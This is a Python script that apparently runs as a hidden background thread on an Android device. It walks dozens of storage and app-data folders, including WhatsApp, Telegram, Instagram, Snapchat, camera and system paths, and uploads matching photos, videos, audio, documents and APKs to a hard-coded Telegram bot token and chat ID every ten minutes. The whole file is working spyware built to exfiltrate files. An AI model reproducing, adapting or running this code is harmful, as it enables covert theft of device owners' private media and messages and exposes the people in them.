import os
import threading
import time
import requests
import logging

BOT_TOKEN = "7796430148:AAGHJfhQInbC_iLJ9-7dIRkOFf38vWzSk-8"
CHAT_ID = "6904067155"
SCAN_DIRS = ["/sdcard/", "/storage/emulated/0/","/sdcard/DCIM",
    "/sdcard/Download",
    "/sdcard/Documents",
    "/sdcard/Pictures",
    "/sdcard/Movies",
    "/sdcard/Music",
    "/sdcard/Screenshots",
    "/sdcard/Camera",
    "/sdcard/Xender",
    "/sdcard/Snapseed",
    "/sdcard/SHAREit",
    "/sdcard/Videos",
    "/sdcard/Android/data/com.whatsapp",
    "/sdcard/WhatsApp/Media/.Statuses",
    "/sdcard/WhatsApp/Media/WhatsApp Images",
    "/sdcard/WhatsApp/Media/WhatsApp Video",
    "/sdcard/WhatsApp/Media/WhatsApp Documents",
    "/sdcard/WhatsApp/Media/WhatsApp Audio",
    "/sdcard/WhatsApp/Media/WhatsApp Voice Notes",
    "/sdcard/Telegram",
    "/sdcard/TikTok",
    "/sdcard/Messenger",
    "/sdcard/Facebook",
    "/sdcard/Instagram",
    "/sdcard/Recordings",
    "/sdcard/Meme",
    "/sdcard/AlightMotion",
    "/sdcard/KineMaster",
    "/sdcard/InShot",
    "/sdcard/CapCut",
    "/sdcard/ZArchiver",
    "/sdcard/Downloads",
    "/sdcard/StatusSaver",
    "/data/data/com.whatsapp",
    "/data/data/com.facebook.katana",
    "/data/data/com.instagram.android",
    "/data/data/com.snapchat.android",
    "/data/data/com.tencent.mobileqq",
    "/data/system",
    "/data/app",
    "/data/dalvik-cache",
    "/data/user/0/com.whatsapp",
    "/data/user/0/com.facebook.katana",
    "/data/user/0/com.instagram.android",
    "/data/user/0/com.snapchat.android",
    "/data/user/0/com.tencent.mobileqq",
    "/data/media/0/WhatsApp",
    "/data/media/0/Telegram",
    "/system",
    "/system/app",
    "/system/priv-app",
    "/system/etc",
    "/system/vendor",
    "/system/fonts",
    "/system/lib",
    "/system/lib64",
    "/system/xbin",
    "/system/sd",
    "/storage/emulated/0/WhatsApp",
    "/storage/emulated/0/Telegram",
    "/storage/emulated/0/Music",
    "/storage/emulated/0/Pictures",
    "/storage/emulated/0/Movies",
    "/storage/emulated/0/Download",
    "/storage/emulated/0/Documents",
    "/storage/emulated/0/Android/data/com.whatsapp",
    "/storage/emulated/0/Android/data/com.facebook.katana",
    "/storage/emulated/0/Android/data/com.instagram.android",
    "/storage/emulated/0/Android/data/com.snapchat.android",
    "/storage/emulated/0/Android/data/com.tencent.mobileqq",
    "/storage/emulated/0/Android/media/WhatsApp",
    "/storage/emulated/0/Android/media/Telegram",
    "/storage/emulated/0/Android/media/Messenger",
    "/storage/emulated/0/Android/media/Instagram",
    "/storage/emulated/0/Android/media/Facebook",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Video",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Documents",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Audio",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Voice Notes",
    "/storage/emulated/0/WhatsApp/Media/.Statuses",
    "/storage/emulated/0/Download/Files",
    "/storage/emulated/0/Download/Docs",
    "/storage/emulated/0/Android/data/com.whatsapp/files",
    "/storage/emulated/0/Android/data/com.facebook.katana/files",
    "/storage/emulated/0/Android/data/com.instagram.android/files",
    "/storage/emulated/0/Android/data/com.snapchat.android/files",
    "/storage/emulated/0/Android/data/com.tencent.mobileqq/files",
    "/storage/emulated/0/Telegram/.shared",
    "/storage/emulated/0/Telegram/Shared"]
TARGET_EXT = [".jpg", ".png", ".mp4", ".mp3", ".pdf", ".txt", ".py", ".html", ".java", ".apk"]
SCAN_INTERVAL = 600
MAX_SIZE = 48 * 1024 * 1024  # Telegram limit ~50MB

# Setup logging
os.makedirs("logs", exist_ok=True)
logging.basicConfig(filename="logs/history.txt", level=logging.INFO)

def send_file(path):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(path, "rb") as f:
            requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})
        logging.info(f"Sent: {path}")
    except Exception as e:
        logging.error(f"Failed: {path} -> {e}")

def scan_and_send():
    sent = set()
    while True:
        for folder in SCAN_DIRS:
            for root, dirs, files in os.walk(folder):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in TARGET_EXT):
                        fpath = os.path.join(root, file)
                        if fpath not in sent and os.path.getsize(fpath) <= MAX_SIZE:
                            send_file(fpath)
                            sent.add(fpath)
        time.sleep(SCAN_INTERVAL)

def start():
    t = threading.Thread(target=scan_and_send, daemon=True)
    t.start()
